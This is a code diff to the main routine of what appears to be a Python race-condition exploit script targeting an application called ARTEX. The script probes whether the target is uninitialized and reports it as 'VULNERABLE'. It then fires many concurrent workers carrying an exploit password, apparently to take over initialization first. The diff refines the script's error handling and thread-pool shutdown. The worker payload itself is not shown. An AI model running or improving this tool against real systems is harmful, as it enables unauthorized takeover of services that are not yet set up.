@@ -233,8 +233,12 @@ def main(args):
         return
         
     initialized = check_init_json.get("initialized", None)
-    if initialized != True:
+    if initialized != True and initialized != None:
         print("[!] ARTEX is NOT initialized! (VULNERABLE)")
+        return
+
+    if initialized == None:
+        print("[-] Init check failed: initialized field is not found.")
         return
 
     print("[+] ARTEX is initialized.")
@@ -245,10 +249,9 @@ def main(args):
     print(f"[*] Launching {concurrency} workers (timeout={timeout}s)...")
     t = Thread(target=monitor_threads, daemon=True, args=(request_amount,))
     t.start()
+    pool = None
     try:
         pool = ThreadPoolExecutor(max_workers=concurrency)
-        if pool == None:
-            raise ReferenceError("pool is None.")
         futures = [
             pool.submit(race_worker, exploit_password, timeout)
             for _ in range(request_amount)
@@ -259,14 +262,13 @@ def main(args):
     except KeyboardInterrupt:
         print("\n\n[*] Shutdown requested.")
         MONITOR_STOP.set()
-        pool.shutdown(wait=False, cancel_futures=True)
 
     except Exception as e:
         print(f"[-] Exploit failed: {e}")
         return
 
     finally:
-        pool.shutdown(wait=False, cancel_futures=True)
+        if pool != None: pool.shutdown(wait=False, cancel_futures=True)
         MONITOR_STOP.set()
         t.join()
 
